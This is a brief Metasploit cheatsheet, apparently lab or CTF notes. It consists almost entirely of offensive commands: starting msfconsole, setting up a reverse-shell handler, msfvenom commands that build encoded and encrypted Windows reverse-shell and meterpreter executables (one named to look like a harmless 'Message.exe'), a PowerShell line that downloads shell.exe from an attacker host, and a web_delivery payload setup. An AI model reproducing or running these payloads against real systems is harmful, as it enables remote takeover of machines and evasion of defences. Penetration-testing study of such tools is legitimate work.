# Metasploit Cheatsheet

## start metasploit

/opt/metasploit-framework/bin/msfconsole

## search for exploit

search exploitname

## show what option need to be filled

show options

## set the options

set RHOSTS 10.0.0.0

## set the lhost

set LHOST 10.1.0.25

## creating netcat listener

use exploit/multi/handler
set LHOST 10.9.1.25
set LPORT 1337
exploit -j

## Creating Windows Payload

- msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.25 LPORT=9999 -e x86/shikata_ga_nai -f exe -o 9999.exe

- msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai --encrypt aes256 LHOST=10.10.168.173 LPORT=9999 -f exe -o 9999.exe

- powershell Invoke-WebRequest -Uri http://10.10.168.173:9000/shell.exe -Outfile shell.exe

- msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.9.1.25 LPORT=9999 -f exe -o 9999.exe

- msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.1.25 LPORT=8888 -f exe -o Message.exe

## Creating webupload payload windows

- use exploit/multi/script/web_delivery
- set payload windows/meterpreter/reverse_tcp
- set target 2
- set LHOST 10.10.168.173
- set LPORT 9999
